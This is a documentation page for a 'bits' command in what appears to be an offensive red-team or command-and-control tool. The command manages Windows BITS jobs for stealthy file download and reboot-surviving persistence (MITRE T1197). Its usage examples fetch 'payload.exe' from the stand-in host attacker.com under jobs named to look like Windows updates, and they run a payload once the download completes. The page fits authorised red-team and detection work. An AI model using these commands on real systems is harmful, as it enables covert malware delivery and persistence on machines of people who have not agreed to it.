+++
title = "bits"
chapter = false
weight = 160
hidden = false
+++

## Summary

Manage BITS (Background Intelligent Transfer Service) transfer jobs for persistence and stealthy file download. BITS jobs survive reboots, transfer files using Windows' native BITS infrastructure, and can execute a command upon completion — making them useful for persistence.

{{% notice info %}}Windows Only{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | list | `list` — enumerate all BITS jobs. `create` — create a download job. `persist` — create a download job with notification command. `cancel` — remove a job by name |
| name | Varies | | Display name for the BITS job (required for create/persist/cancel) |
| url | Varies | | Remote URL to download from (required for create/persist) |
| path | Varies | | Local file path to save the download (required for create/persist). Must use backslashes |
| command | Varies | | Program to execute when download completes (required for persist). Full path to executable |
| cmd_args | No | | Arguments for the notification command (persist action) |

## Usage

**List all BITS jobs:**
```
bits
bits -action list
```

**Create a download job:**
```
bits -action create -name "WindowsUpdate" -url "http://attacker.com/payload.exe" -path "C:\Users\Public\update.exe"
```

**Create a persistent job (executes command on download completion):**
```
bits -action persist -name "UpdateCheck" -url "http://attacker.com/data.dat" -path "C:\Users\Public\data.dat" -command "C:\Users\Public\payload.exe"
```

**Cancel a job by name:**
```
bits -action cancel -name "WindowsUpdate"
```

## Example Output

**List:**
```
[*] BITS Job Enumeration (T1197)
[+] Found 2 BITS jobs

Job ID                               Name                 State        Progress        Files
----------------------------------------------------------------------------------------------------
{6EC08B7E-790B-4FB2-A053-7E23011E1225} WindowsUpdate        Transferring 45% (2.3 MB)    0/1
{0C43F924-0F8B-444A-A3DF-9AC1E120486E} UpdateCheck          Suspended    0/0 bytes       0/1
```

**Create:**
```
[*] BITS Download Job Created (T1197)
[+] Job Name: WindowsUpdate
[+] Job ID:   {6EC08B7E-790B-4FB2-A053-7E23011E1225}
[+] URL:      http://attacker.com/payload.exe
[+] Path:     C:\Users\Public\update.exe
[+] Status:   Downloading
```

**Persist:**
```
[*] BITS Persistence Job Created (T1197)
[+] Job Name:    UpdateCheck
[+] Job ID:      {0C43F924-0F8B-444A-A3DF-9AC1E120486E}
[+] URL:         http://attacker.com/data.dat
[+] Local Path:  C:\Users\Public\data.dat
[+] Notify Cmd:  C:\Users\Public\payload.exe
[+] Status:      Downloading (command runs on completion)

[!] The notification command will execute when the download completes.
[!] BITS jobs survive reboots and run as the creating user.
```

## Operational Notes

- Uses raw COM vtable calls to IBackgroundCopyManager/Job/Job2 (no IDispatch)
- BITS jobs survive reboots and resume automatically
- Persistence via `SetNotifyCmdLine` (IBackgroundCopyJob2) executes a command when transfer completes or errors
- Local paths must use backslashes (`C:\Users\...`), forward slashes are rejected by the BITS API
- Jobs run under the security context of the creating user
- `list` first tries current-user jobs, falls back to all-users enumeration
- Job states: Queued, Connecting, Transferring, Suspended, Error, TransientError, Transferred, Acknowledged, Cancelled

## MITRE ATT&CK Mapping

- **T1197** — BITS Jobs
